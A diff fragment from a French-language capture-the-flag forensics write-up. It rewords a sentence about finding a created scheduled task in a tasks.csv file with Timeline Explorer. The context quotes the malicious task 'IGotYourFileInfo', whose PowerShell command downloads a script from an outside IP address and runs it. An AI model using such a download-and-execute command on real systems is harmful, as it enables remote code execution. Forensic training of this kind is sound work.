@@ -87,7 +87,7 @@ Première partie du flag : `Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olymp
 
 - **Quel est le nom de la scheduled task créée ?**
 
-Visible dans `M:\forensic\csv\tasks.csv` qu’on va analyser dans timeline explorer (fichier .tle_sess)
+On utilise le fichier visible dans `M:\forensic\csv\tasks.csv`. On va analyser dans timeline explorer (fichier .tle_sess)
 
 On voit la première task `IGotYourFileInfo` ayant pour ligne de commande `Invoke-WebRequest` et pour paramètre `-Uri http://172.21.195.17:5000/Holmes/GetFileInfo.ps1 -OutFile GetFilesInfo.ps1 ; Start-Process -FilePath GetFilesInfo.ps1`
 
